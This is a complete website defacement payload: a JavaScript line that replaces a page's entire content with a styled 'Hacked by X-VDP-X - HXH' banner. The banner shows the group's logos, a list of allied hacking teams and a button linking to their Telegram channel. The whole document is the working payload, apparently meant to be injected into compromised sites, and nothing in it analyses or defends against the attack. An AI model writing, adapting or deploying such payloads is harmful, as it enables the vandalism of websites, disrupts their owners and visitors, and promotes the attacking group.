document.documentElement.innerHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Hacked by X-VDP-X - HXH</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      background: radial-gradient(ellipse at center, #000 0%, #111 100%);
      color: #fff;
      font-family: 'Courier New', monospace;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 40px 20px;
      text-align: center;
      animation: fadeIn 2s ease-in-out;
    }

    @keyframes fadeIn {
      0% { opacity: 0; transform: scale(0.98); }
      100% { opacity: 1; transform: scale(1); }
    }

    h1 {
      font-size: 4rem;
      color: #ff0000;
      text-shadow: 0 0 20px #ff0000, 0 0 40px #990000;
      margin-bottom: 50px;
      user-select: none;
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0%, 100% { text-shadow: 0 0 20px #ff0000, 0 0 40px #990000; }
      50% { text-shadow: 0 0 30px #ff3333, 0 0 60px #cc0000; }
    }

    .logos {
      display: flex;
      justify-content: center;
      gap: 40px;
      margin-bottom: 30px;
      flex-wrap: wrap;
    }

    .logos img {
      height: 150px;
      border-radius: 12px;
      box-shadow: 0 0 25px rgba(255, 0, 0, 0.5);
      transition: transform 0.3s;
    }

    .logos img:hover {
      transform: scale(1.05);
    }

    .hashtag-line {
      font-size: 1.8rem;
      color: #ff0000;
      text-shadow: 0 0 12px #ff0000, 0 0 25px #990000;
      margin: 30px 0 40px;
      border-bottom: 2px solid #ff0000;
      padding-bottom: 10px;
      letter-spacing: 0.12em;
      font-weight: bold;
      overflow-x: auto;
      white-space: nowrap;
    }

    .newalliance {
      font-size: 2rem;
      color: #ffaa00;
      text-shadow: 0 0 12px #ffaa00;
      margin-bottom: 15px;
    }

    .xvdp {
      font-size: 2.3rem;
      color: #ff0000;
      text-shadow: 0 0 10px #ff0000;
      font-weight: bold;
      margin-bottom: 10px;
    }

    .hxh {
      font-size: 2.3rem;
      font-weight: bold;
      margin-bottom: 20px;
    }

    .hxh span {
      padding: 0 8px;
    }

    .hxh .red {
      color: #d90012;
      text-shadow: 0 0 10px #d90012;
    }

    .hxh .blue {
      color: #0033a0;
      text-shadow: 0 0 10px #0033a0;
    }

    .hxh .orange {
      color: #f2a800;
      text-shadow: 0 0 10px #f2a800;
    }

    .teams {
      font-size: 1.5rem;
      color: #ff0000;
      text-shadow: 0 0 8px #ff0000;
      margin-bottom: 40px;
      letter-spacing: 0.1em;
    }

    .btn {
      padding: 14px 32px;
      font-size: 1.2rem;
      color: #000;
      background-color: #ffaa00;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-weight: bold;
      box-shadow: 0 0 15px #ffaa00;
      transition: all 0.3s;
    }

    .btn:hover {
      background-color: #ffcc33;
      box-shadow: 0 0 25px #ffcc33;
      transform: scale(1.05);
    }

    @media (max-width: 480px) {
      h1 { font-size: 2.5rem; }
      .hashtag-line { font-size: 1.3rem; }
      .newalliance, .xvdp, .hxh, .teams { font-size: 1.2rem; }
      .logos img { height: 100px; }
      .btn { padding: 10px 24px; font-size: 1rem; }
    }
  </style>
</head>
<body>
  <h1>Hacked by X-VDP-X - HXH</h1>

  <div class="logos">
    <img src="https://i.postimg.cc/q79gXyTp/image-2.webp" alt="Logo VDP" />
    <img src="https://i.ibb.co/SDvRZ3X5/HXH-ARMENIEN.png" alt="Logo HxH" />
  </div>

  <div class="hashtag-line"># Hack world # X-VDP-X # HXH # HACKED</div>

  <div class="newalliance">New Alliance :</div>
  <div class="xvdp">X-VDP-X</div>
  <div class="hxh">
    <span class="red">H</span>
    <span class="blue">X</span>
    <span class="orange">H</span>
  </div>
  <div class="teams">Cyber_Hay | Diable'Fire | L’Ombre Noire</div>

  <button class="btn" onclick="window.location.href='https://t.me/xvdpx'">Join Telegram</button>
</body>
</html>
`;
